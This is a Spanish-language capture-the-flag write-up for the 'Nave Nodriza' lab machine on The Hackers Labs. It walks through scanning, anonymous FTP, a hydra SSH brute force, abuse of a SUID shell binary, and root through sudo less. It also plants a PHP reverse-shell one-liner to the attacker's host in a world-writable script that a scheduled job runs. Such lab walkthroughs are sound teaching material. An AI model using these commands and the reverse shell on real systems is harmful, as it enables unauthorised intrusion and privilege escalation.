---
creator: nohh022
pubDatetime: 2026-05-09T01:00:00Z
title: Nave Nodriza
slug: nave-nodriza
platform: The Hackers Labs
ogImage: ../../assets/images/thehackerslabs/nave-nodriza/nave-nodriza.jpg
featured: true
tags:
  - sudo
  - suid
  - linux
description:
  Write up de la máquina Nave Nodriza de la plataforma The Hackers Labs
---

![logo](../../assets/images/thehackerslabs/nave-nodriza/nave-nodriza.jpg)

## Table of contents

## Enumeración

La máquina Nave Nodriza tiene la ip **10.0.2.33** y nuestra máquina tiene la ip **10.0.2.3**

### Descubrimiento de Puertos

Vamos a empezar enumerando todos los puertos abiertos de la máquina, así como los servicios y las versiones que se están ejecutando en ellos mediante la herramienta **nmap**.

```bash
nmap -sS -p- --open -sCV --min-rate 5000 -n -Pn 10.0.2.33

Nmap scan report for 10.0.2.33
Host is up (0.00026s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.0.2.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 65534    65534        4096 Dec 09 02:32 archivos_publicos
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
80/tcp open  http    Apache httpd 2.4.65 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.65 (Debian)
```

### Puerto 21 (FTP)

El usuario **anonymous** está habilitado así que nos conectamos con él al servicio.

```bash
ftp -a 10.0.2.33

ftp> ls
229 Entering Extended Passive Mode (|||8076|)
150 Here comes the directory listing.
dr-xr-xr-x    3 65534    65534        4096 Dec 09 02:26 .
dr-xr-xr-x    3 65534    65534        4096 Dec 09 02:26 ..
drwxr-xr-x    2 65534    65534        4096 Dec 09 02:32 archivos_publicos
226 Directory send OK.

ftp> cd archivos_publicos
250 Directory successfully changed.

ftp> ls 
229 Entering Extended Passive Mode (|||23438|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             622 Dec 09 02:32 manifiesto_clase_alpha.txt
226 Directory send OK.
```

Tenemos un directorio **archivos_publicos** y en él un archivo de texto que nos descargamos.

El archivo **manifiesto_clase_alhpa.txt** contiene:

```text
[NAVE NODRIZA - BITÁCORA DE COMUNICACIÓN]

Mensaje para el Capitán Jano:

"Capitán, confirmo el descenso de emergencia en Titán. La tripulación fue reubicada en grupos de trabajo basados en su rango. Lamentablemente, el protocolo de seguridad falló en las bajas jerarquías. La contraseña de mi terminal de acceso (SSH) fue comprometida; es un término de uso muy común aquí, lo encontré en un listado de seguridad de la vieja Tierra. Debe ser reemplazada inmediatamente. Necesito que el equipo de Analistas me abra un canal de escalada urgente para recuperar el control de mi sesión."

Atentamente,
excluido
```

## Explotación

Leyendo el archivo encontramos un posible usuario, **excluido** e información acerca de que su contraseña del servicio **SSH** está en una wordlist, intuímos que el **rockyou**.

Vamos a hacer un ataque de fuerza bruta con **hydra** contra el servicio **SSH** con ese usuario y wordlist

```bash
hydra -l excluido -P /usr/share/wordlists/rockyou.txt ssh://10.0.2.33 

[DATA] attacking ssh://10.0.2.33:22/

[22][ssh] host: 10.0.2.33   login: excluido   password: password

1 of 1 target successfully completed, 1 valid password found
```

## Acceso SSH
### Excluido

Conseguimos las credenciales del usuario **excluido**, así que nos conectamos por **SSH** con ellas.

```bash
ssh excluido@10.0.2.33
***************************************************
* ADVERTENCIA: CONEXIÓN A NAVE-NODRIZA ACTIVA   *
* PROTOCOLO ALPHA. ACCESO RESTRINGIDO.          *
***************************************************
excluido@10.0.2.33's password: 

excluido@TheHackersLabs-NaveNodriza:~$ ls -la
total 36
drwxr-xr-x 2 excluido excluido 4096 ene 24 22:18 .
drwxr-xr-x 7 root     root     4096 ene 24 23:14 ..
-rw------- 1 excluido excluido  766 ene 30 03:02 .bash_history
-rw-r--r-- 1 excluido excluido  220 abr 23  2023 .bash_logout
-rw-r--r-- 1 excluido excluido 3550 dic  9 01:14 .bashrc
-rw-r--r-- 1 root     root      236 ene 24 22:09 CAPITULO_1_FTP.txt
-rw-r--r-- 1 excluido excluido  269 ene 24 22:14 Pista_CAPITULO_2.txt
-rw-r--r-- 1 excluido excluido  807 abr 23  2023 .profile
-rw------- 1 excluido excluido   42 dic  9 03:55 user.txt
```

Si revisamos el archivo **Pista_CAPITULO_2.txt**:

```text
[CAPÍTULO 2: ESCALADA DE RANGO]
-----------------------------
Un comando de uso frecuente en el sistema fue modificado por el equipo de Analistas de Datos para ejecutar tareas con su identidad.
Necesito encontrar el archivo y, debo usarlo para entrar a sus sistemas.
```

## Escalada de Privilegios
### Analista


Esta pista nos sugiere un archivo que nos proporciona una shell como otro usuario, por lo que vamos a buscar archivos con permisos **SUID**

```bash
find / -perm -4000 2>/dev/null

/usr/bin/chsh
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/opt/nave_nodriza_herramientas/ejecutor_shell
```

Vemos un **ejecutor_shell**, por lo que lo ejecutamos y obtenemos una shell como el usuario **analista**

```bash
excluido@TheHackersLabs-NaveNodriza:~$ /opt/nave_nodriza_herramientas/ejecutor_shell
analista@TheHackersLabs-NaveNodriza:~$ whoami
analista
```

### Investigador

Ahora si revisamos el directorio de este usuario vemos un script de bash, **procesar_datos.sh**, dentro de **log_temporal_sistema**

```bash
analista@TheHackersLabs-NaveNodriza:~$ ls -la /home/analista/
total 28
drwxr-xr-x 3 analista analista 4096 ene 24 22:43 .
drwxr-xr-x 7 root     root     4096 ene 24 23:14 ..
-rw-r--r-- 1 analista analista  220 abr 23  2023 .bash_logout
-rw-r--r-- 1 analista analista 3550 dic  9 01:14 .bashrc
-rw-r--r-- 1 analista analista  481 ene 24 22:43 CAPITULO_2.txt
drwxrwxrwx 2 root     root     4096 may  9 09:51 log_temporal_sistema
-rw-r--r-- 1 analista analista  807 abr 23  2023 .profile

analista@TheHackersLabs-NaveNodriza:~$ ls -la /home/analista/log_temporal_sistema/
total 12
drwxrwxrwx 2 root     root     4096 may  9 09:51 .
drwxr-xr-x 3 analista analista 4096 ene 24 22:43 ..
-rwxr-xr-x 1 analista excluido   66 may  9 09:51 procesar_datos.sh
```

Este script no contiene nada interesante pero vemos que el directorio **log_temporal_sistema** tiene permisos **777** por lo que nos da a entender que este script es ejecutado por algún usuario.

Vamos a emplear la herramienta **pspy64** para ver si este script se está ejecuntado cada cierto tiempo y por quien.

Para pasarlo a la máquina vamos a usar **scp** y las credenciales de **SSH** del usuario **excluido**

```bash
scp pspy64 exluido@10.0.2.33:/tmp/pspy64
```

Nos convertimos un momento en excluido para darle permisos de ejecución al pspy64 con **chmod +x** y lo ejecutamos.

```bash
analista@TheHackersLabs-NaveNodriza:~$ /tmp/pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


2026/05/09 10:00:00 CMD: UID=1003  PID=1018   | /bin/sh -c /home/analista/log_temporal_sistema/procesar_datos.sh 
```

Tras esperar un poco vemos que el script es ejecutado con **sh** por un usuario con **UID** 1003, se trata del usuario **investigador**.

Como el directorio en el que está el script tiene permisos **777** podemos borrar el script y crear un nuevo script que nos mande una reverse shell.

Al ser **sh**, la típica reverse shell nos puede dar problemas, por lo que vamos a usar **php**.

Borramos el script **procesar_datos.sh**

Y creamos un nuevo **procesar_datos.sh** que contenga:

```bash
php -r '$sock=fsockopen("10.0.2.3",443);exec("sh <&3 >&3 2>&3");'
```

Le damos permisos de ejecución con **chmod +x** y nos ponemos en escucha en nuestra máquina con **netcat**

```bash
nc -nlvp 443
```

Esperamos y conseguimos una shell como **investigador**. Sólo nos queda realizar el tratamiento de la **TTY**.

### Root

Revisamos los permisos **sudoers** del usuario **investigador**.

```bash
investigador@TheHackersLabs-NaveNodriza:~$ sudo -l
sudo: unable to resolve host TheHackersLabs-NaveNodriza: Nombre o servicio desconocido
Matching Defaults entries for investigador on TheHackersLabs-NaveNodriza:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User investigador may run the following commands on TheHackersLabs-NaveNodriza:
    (root) NOPASSWD: /usr/bin/less
```

Observamos que podemos ejecutar el binario de **less** como el usuario **root** sin proporcionar contraseña.

Por lo tanto,

```bash
sudo /usr/bin/less /etc/hosts

!/bin/bash
```

Y nos convertimos en **root**

```bash
root@TheHackersLabs-NaveNodriza:~$ ls -la /root/
total 28
drwx------  4 root root 4096 ene 24 23:19 .
drwxr-xr-x 18 root root 4096 dic  9 01:04 ..
lrwxrwxrwx  1 root root    9 ene 24 23:19 .bash_history -> /dev/null
-rw-r--r--  1 root root  571 abr 10  2021 .bashrc
-rw-r--r--  1 root root   47 dic  9 03:42 flag.txt
drwxr-xr-x  3 root root 4096 oct 16  2024 .local
-rw-r--r--  1 root root  161 jul  9  2019 .profile
drwx------  2 root root 4096 oct 16  2024 .ssh
```